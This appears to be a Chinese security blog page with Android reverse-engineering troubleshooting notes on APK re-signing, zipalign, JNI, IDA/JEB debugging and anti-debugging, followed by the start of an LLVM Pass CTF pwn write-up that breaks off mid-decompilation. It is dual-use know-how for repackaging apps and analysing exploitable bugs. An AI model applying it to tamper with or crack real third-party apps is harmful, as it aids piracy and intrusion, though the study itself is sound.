          <a href="#1-AndroidKill修改签名" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-AndroidKill修改签名" class="headerlink" title="1.AndroidKill修改签名"></a>1.AndroidKill修改签名</h2>
      <p><code>Androidkill</code>原始的签名只能是V1，但是现在使用v1签名在安卓11以上无法安装，所以更改一下签名脚本<code>AndroidRev\Tool\AndroidKiller\bin\apktool\signer.bat</code></p>
<p>更改为：</p>
<figure class="highlight bat"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">@<span class="built_in">echo</span> %<span class="number">1</span></span><br><span class="line">@<span class="built_in">echo</span> %<span class="number">2</span></span><br><span class="line">java -jar &quot;%~dp0\apksigner.jar&quot; sign --ks &quot;%~dp0\my-release-key.keystore&quot; --ks-key-alias my-key-alias --ks-pass pass:<span class="number">123456</span> --key-pass pass:<span class="number">123456</span> --out %<span class="number">2</span> %<span class="number">1</span></span><br></pre></td></tr></table></div></figure>

<p>这个<code>apksigner.jar</code>用哪个都行，需要放入<code>AndroidRev\Tool\AndroidKiller\bin\apktool\</code>中</p>
<p>同时需要用如下命令生成签名密钥<code>my-release-key.keystore</code>，密码都设置为123456即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000</span><br></pre></td></tr></table></div></figure>

<p>将生成的签名密钥<code>my-release-key.keystore</code>放入<code>AndroidRev\Tool\AndroidKiller\bin\apktool\</code>即可。</p>
<p>注意更新一下java</p>

        <h2 id="2-4字节对齐问题"   >
          <a href="#2-4字节对齐问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-4字节对齐问题" class="headerlink" title="2.4字节对齐问题"></a>2.4字节对齐问题</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Work\AndroidRev\Tool\AndroidKiller\projects\jiaochen\Bin&gt; adb install .\jiaochen_killer.apk</span><br><span class="line">Performing Streamed Install</span><br><span class="line">adb: failed to install .\jiaochen_killer.apk: Failure [-124: Failed parse during installPackageLI: Targeting R+ (version 30 and above) requires the resources.arsc of installed APKs to be stored uncompressed and aligned on a 4-byte boundary]</span><br></pre></td></tr></table></div></figure>

<p>这时候就是4字节对问题</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/jeephao/article/details/117673542" >https://blog.csdn.net/jeephao/article/details/117673542</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>那么就需要在签名之前用<code>zipalign</code>对齐一下，将<code>zipalign.exe</code>放入<code>AndroidRev\Tool\AndroidKiller\bin\apktool\</code>中，修改一下上面的脚本</p>
<figure class="highlight bat"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">@<span class="built_in">echo</span> %<span class="number">1</span></span><br><span class="line">@<span class="built_in">echo</span> <span class="variable">%2</span></span><br><span class="line"><span class="variable">&quot;%</span>~dp0\zipalign.exe&quot; -f -v <span class="number">4</span> %<span class="number">1</span> %<span class="number">2</span></span><br><span class="line">java -jar &quot;%~dp0\apksigner.jar&quot; sign --ks &quot;%~dp0\my-release-key.keystore&quot; --ks-key-alias my-key-alias --ks-pass pass:<span class="number">123456</span> --key-pass pass:<span class="number">123456</span> %<span class="number">2</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="3-smali代码参数问题"   >
          <a href="#3-smali代码参数问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-smali代码参数问题" class="headerlink" title="3.smali代码参数问题"></a>3.smali代码参数问题</h2>
      <p>特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法</p>

        <h2 id="4-导入C语言头结构问题"   >
          <a href="#4-导入C语言头结构问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-导入C语言头结构问题" class="headerlink" title="4.导入C语言头结构问题"></a>4.导入C语言头结构问题</h2>
      <p>在JNI分析时，有时候.so文件没有保存符号，就需要导入jni.h头文件，然后就自己选择相关结构进行解析：</p>
<p>File-&gt;Load file-&gt;Parse C header file</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116150842630.png" alt="image-20240116150842630"></p>
<p>选择jni.h解析之后，在变量右键，选择Convert to struct*，即可看到导入的结构</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116150935826.png" alt="image-20240116150935826"></p>
<p>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116151004671.png" alt="image-20240116151004671"></p>
<p>在逆向时都可以的</p>

        <h2 id="5-NDK的so文件调试"   >
          <a href="#5-NDK的so文件调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-NDK的so文件调试" class="headerlink" title="5.NDK的so文件调试"></a>5.NDK的so文件调试</h2>
      <p>导入IDA的android_server用root运行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116161134888.png" alt="image-20240116161134888"></p>
<p>adb运行端口转发</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116161152268.png" alt="image-20240116161152268"></p>
<p>IDA附加调试即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116161202324.png" alt="image-20240116161202324"></p>

        <h2 id="6-JNI注册函数"   >
          <a href="#6-JNI注册函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-JNI注册函数" class="headerlink" title="6.JNI注册函数"></a>6.JNI注册函数</h2>
      
        <h3 id="静态注册函数"   >
          <a href="#静态注册函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态注册函数" class="headerlink" title="静态注册函数"></a>静态注册函数</h3>
      <ul>
<li><p>在JAVA层如下，有static修饰的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118160738824.png" alt="image-20240118160738824"></p>
</li>
<li><p>在IDA中一般在Exports导出函数中可以查看到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118160901982.png" alt="image-20240118160901982"></p>
</li>
</ul>

        <h3 id="动态注册函数"   >
          <a href="#动态注册函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态注册函数" class="headerlink" title="动态注册函数"></a>动态注册函数</h3>
      <ul>
<li>在JAVA层如下，动态注册函数</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118160527165.png" alt="image-20240118160527165"></p>
<ul>
<li>一般在IDA的.data.rel.ro.local段，这个sub_1174即为注册函数checkport的地址</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117150115479.png" alt="image-20240117150115479"></p>
<p>并且第一个参数均为__JNIEnv*，可以导入jni.h进行修改</p>

        <h2 id="7-反调试"   >
          <a href="#7-反调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-反调试" class="headerlink" title="7.反调试"></a>7.反调试</h2>
      <p>常见的反调试有：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223460.htm" >原创]【SO壳】17种安卓native反调试收集-Android安全-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="8-IDA调试问题"   >
          <a href="#8-IDA调试问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-IDA调试问题" class="headerlink" title="8.IDA调试问题"></a>8.IDA调试问题</h2>
      <p>在连接so进行调试时</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 (jdb挂起)</span><br></pre></td></tr></table></div></figure>

<p>这个可能导致</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2.java.io.IOException: handshake failed - connection prematurally closed</span><br><span class="line">        at com.sun.tools.jdi.SocketTransportService.handshake(SocketTransportService.java:136)</span><br><span class="line">        at com.sun.tools.jdi.SocketTransportService.attach(SocketTransportService.java:232)</span><br><span class="line">        at com.sun.tools.jdi.GenericAttachingConnector.attach(GenericAttachingConnector.java:116)</span><br><span class="line">        at com.sun.tools.jdi.SocketAttachingConnector.attach(SocketAttachingConnector.java:90)</span><br><span class="line">        at com.sun.tools.example.debug.tty.VMConnection.attachTarget(VMConnection.java:519)</span><br><span class="line">        at com.sun.tools.example.debug.tty.VMConnection.open(VMConnection.java:328)</span><br><span class="line">        at com.sun.tools.example.debug.tty.Env.init(Env.java:63)</span><br><span class="line">        at com.sun.tools.example.debug.tty.TTY.main(TTY.java:1066)</span><br><span class="line">致命错误:</span><br><span class="line">无法附加到目标 VM。</span><br></pre></td></tr></table></div></figure>

<p>大多是手机问题，或者存在反调试，选择低版本的手机</p>

        <h2 id="9-永久调试权限问题"   >
          <a href="#9-永久调试权限问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-永久调试权限问题" class="headerlink" title="9.永久调试权限问题"></a>9.永久调试权限问题</h2>
      <p>这个问题出现在JEB4上面，换成JEB5可以了</p>
<p>当用MagiskHide Props Config获取永久调试权限时</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119163123342.png" alt="image-20240119163123342"></p>
<p>再使用JEB调试，记得还是需要修改一下<code>AndroidManifest.xml</code>的debuggable，不然JEB可能还是无法调试，估计是JEB分析APK时，也会检查APK中的<code>AndroidManifest.xml</code>的debuggabel选项，如果没设置或者不为True，那么仍然不给调试，这个可能时JEB的关系，和手机APP没什么关系。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1714727-1-1.html" >《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="10-算法助手与Android13"   >
          <a href="#10-算法助手与Android13" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-算法助手与Android13" class="headerlink" title="10.算法助手与Android13"></a>10.算法助手与Android13</h2>
      <p>有时候算法助手会有这个要求</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125144058321.png" alt="image-20240125144058321"></p>
<p>但是点进去又无法成功，使用此文件夹还是不行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125144128020.png" alt="image-20240125144128020"></p>
<p>需要在Android/data/目录下新建包名文件夹，使用这个文件夹即可，此时算法助手就能自动定位到了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125144238337.png" alt="image-20240125144238337"></p>

        <h1 id="参考"   >
          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=742703&highlight=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D6%B5%EF%BF%BD" >《教我兄弟学Android逆向系列课程+附件导航帖》 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1692384-1-1.html" >《关于我在吾爱破解论坛学安卓逆向这档事》预告 - 『水漫金山』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/07/LLVM%E5%AD%A6%E4%B9%A0/">LLVM学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-09-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>从<code>CTF</code>角度来说，会给出一个运行程序<code>opt</code>和一个库<code>xx.so</code>，然后做题需要提供一个<code>exp.ll</code>，传递给<code>opt</code>。这个<code>exp.ll</code>是通过<code>exp.c</code>进行中间表达式生成的，是<code>exp.c</code>在程序中的一个比较直观的结构，类似如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">   read(<span class="number">0</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   write(<span class="number">1</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用命令<code>clang -emit-llvm -S exp.c -o exp.ll</code>得到如下的<code>exp.ll</code>直观的程序中间结构表达式</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;main.c&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;main.c&quot;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">5</span> x i8] c<span class="string">&quot;bye\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">1</span> = alloca [<span class="number">16</span> x i8], align <span class="number">16</span></span><br><span class="line">  %<span class="number">2</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">  %<span class="number">3</span> = call i64 @read(i32 <span class="number">0</span>, i8* %<span class="number">2</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">4</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">  %<span class="number">5</span> = call i64 @write(i32 <span class="number">1</span>, i8* %<span class="number">4</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">6</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* @.str, i64 <span class="number">0</span>, i64 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i64 @read(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare dso_local i64 @write(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare dso_local i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 10.0.0-4ubuntu1 &quot;</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>opt</code>在运行时，加载<code>xx.so</code>，而<code>xx.so</code>的<code>runOnFunction</code>函数会对<code>exp.ll</code>中的函数进行一个对应的解析操作。比如遍历<code>exp.ll</code>中的函数，如果调用了<code>add</code>函数，就获取<code>add</code>函数的第一个参数<code>a1</code>，依据<code>a1</code>的值对全局变量<code>p</code>指针进行加操作，其他的依据<code>write</code>函数什么的进行写操作从而造成任意写漏洞等等。</p>
<p>具体的可以看：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="题目"   >
          <a href="#题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目" class="headerlink" title="题目"></a>题目</h1>
      
        <h2 id="RedHat2021-simpleVM"   >
          <a href="#RedHat2021-simpleVM" class="heading-link"><i class="fas fa-link"></i></a><a href="#RedHat2021-simpleVM" class="headerlink" title="RedHat2021-simpleVM"></a>RedHat2021-simpleVM</h2>
      
        <h3 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>分析<code>VMPass.so</code>，<code>Alt+T</code>搜索一下<code>vtable</code>，找到最后一个函数即为<code>runOnFunction</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828105741726.png" alt="image-20230828105741726"></p>
<p>进入查看进行分析，如果有函数<code>o0o0o0o0</code>，则进入<code>sub_6AC0</code>进行处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828105832996.png" alt="image-20230828105832996"></p>
<p>然后在<code>sub_6AC0</code>函数中在进行循环分析，对每个基本块进行了遍历处理，处理函数为<code>sub_6B80</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828110053292.png" alt="image-20230828110053292"></p>
<p>进入<code>sub_6B80</code>函数，大致分析一下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span 